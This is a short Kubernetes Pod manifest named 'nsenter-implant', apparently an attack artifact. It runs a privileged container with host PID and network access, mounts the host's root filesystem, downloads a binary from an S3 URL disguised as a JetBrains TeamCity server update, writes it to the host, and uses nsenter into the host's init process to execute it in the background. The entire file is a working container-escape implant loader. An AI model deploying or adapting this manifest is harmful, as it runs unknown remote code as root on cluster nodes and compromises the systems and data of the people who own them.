apiVersion: v1
kind: Pod
metadata:
  name: nsenter-implant
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - "apk add --no-cache curl > /dev/null 2>&1 && rm -f /host/tmp/ts && curl -fsSL -o /tmp/ts https://jetbrainsteam-updates.s3.amazonaws.com/teamcity-server-update.bin && cp /tmp/ts /host/tmp/ts && chmod +x /host/tmp/ts && nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'chmod +x /tmp/ts && /tmp/ts &' 2>&1; echo 'DONE'; sleep 99999"
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
  restartPolicy: Never
